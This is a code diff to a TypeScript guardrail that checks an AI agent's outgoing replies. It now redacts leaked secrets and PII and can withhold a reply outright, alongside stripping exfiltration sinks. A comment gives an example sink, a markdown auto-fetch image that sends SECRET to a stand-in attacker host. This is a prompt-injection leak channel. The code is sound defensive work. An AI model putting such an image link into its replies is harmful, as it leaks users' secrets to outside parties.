@@ -75,20 +75,42 @@ export async function gateToolCall(
 export interface ReplyResult {
   text: string;
   changed: boolean;
+  blocked: boolean;
   reason: string;
 }
 
 // before_agent_reply: rewrite the outgoing reply to neutralize exfiltration
-// sinks (e.g. ![](http://attacker/?data=SECRET) auto-fetch images) and flag
-// secrets. openclaw can truly rewrite the reply; this returns the rewritten text.
+// sinks (![](http://attacker/?data=SECRET) auto-fetch images) AND redact leaked
+// secrets/PII. The core's sanitized_text only strips sink URLs, so secret-only
+// replies have sanitized_text === text — we must drive the decision off
+// ev.decision/findings, not off a text diff, and redact the secrets ourselves.
 export async function sanitizeReply(text: string): Promise<ReplyResult> {
   const ev = await egress({ text });
-  if (ev.decision === "allow") return { text, changed: false, reason: "" };
+  if (ev.decision === "allow") return { text, changed: false, blocked: false, reason: "" };
+
+  let out = ev.sanitized_text || text;
+  // Redact the actual secret/PII snippets the core flagged (it doesn't strip them).
+  for (const f of ev.findings) {
+    if ((f.kind === "secret" || f.kind === "pii") && f.snippet) {
+      out = out.split(f.snippet).join(`[airlock-redacted:${f.label}]`);
+    }
+  }
   const labels = [...new Set(ev.findings.map((f) => f.label))].join(", ");
+  const replyBlock = (process.env.AIRLOCK_REPLY_BLOCK ?? "0") !== "0";
+  if (ev.decision === "block" && replyBlock) {
+    // Strongest available action: withhold the reply body entirely.
+    return {
+      text: `[airlock withheld this reply — it appears to leak data (${labels})]`,
+      changed: true,
+      blocked: true,
+      reason: `airlock egress: blocked reply (${labels})`,
+    };
+  }
   return {
-    text: ev.sanitized_text || text,
-    changed: ev.sanitized_text !== text,
-    reason: `airlock egress: neutralized exfil sinks / flagged secrets (${labels})`,
+    text: out,
+    changed: out !== text,
+    blocked: false,
+    reason: `airlock egress: neutralized exfil sinks / redacted secrets (${labels})`,
   };
 }
 
